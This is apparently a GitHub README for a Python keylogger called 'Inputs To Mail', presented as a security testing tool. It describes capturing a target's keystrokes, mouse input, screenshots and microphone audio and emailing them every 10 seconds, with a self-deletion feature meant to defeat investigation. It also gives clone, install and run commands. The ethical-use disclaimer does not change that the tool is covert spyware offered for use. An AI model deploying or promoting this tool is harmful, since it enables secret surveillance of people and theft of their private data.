# 📬 Inputs To Mail - Security Testing Tool

## Description

Welcome to Inputs To Mail - Security Testing Tool ! 🎉 
Inputs To Mail is a security testing tool designed to capture keyboard, mouse, screenshot, and microphone inputs, then send this data securely to your email.
The project aims to test the robustness and security of information systems, providing insights into potential vulnerabilities.

## Features

    ✔ Captures keyboard and mouse inputs.
    ✔ Takes screenshots and records microphone activity.
    ✔ Sends captured data to an email account every 10 seconds.
    ✔ Includes a self-deletion mechanism if the script is tampered with.

## Installation

Clone the repository :

```
git clone https://github.com/gabrielgonta/Keylogger.git
```

Navigate to the project directory :

```
cd Keylogger
```

Install dependencies :

```
pip install -r requirements.txt
```

## Usage

1. Create an email account:
- Use a temporary email account via Mailtrap or a similar service for secure testing.

2. Configure SMTP settings:
- Open keylogger.py and set your SMTP USERNAME and PASSWORD.

3. Run the script:
```
python3 keylogger.py
```

4. Data reception:
- Captured inputs and logs are sent to the configured email every 10 seconds.

5. Self-deletion feature:
- If the target identifies the script and attempts to access sensitive information like the email or password, the program automatically deletes itself to prevent further investigation.

## Antivirus Test Results

Even though the script is designed for ethical testing purposes, its behavior may trigger antivirus software. Here's an example of antivirus detections:

![github-small](/images/1.png)

![github-small](/images/2.png)

## Purpose and Ethical Use

This tool is intended exclusively for educational purposes and to help security professionals identify weaknesses in their systems. Unauthorized or malicious use is strictly prohibited.

## Authors

* **Gabriel Gonta** - *Initial work* - [Keylogger](https://github.com/gabrielgonta/Keylogger.git)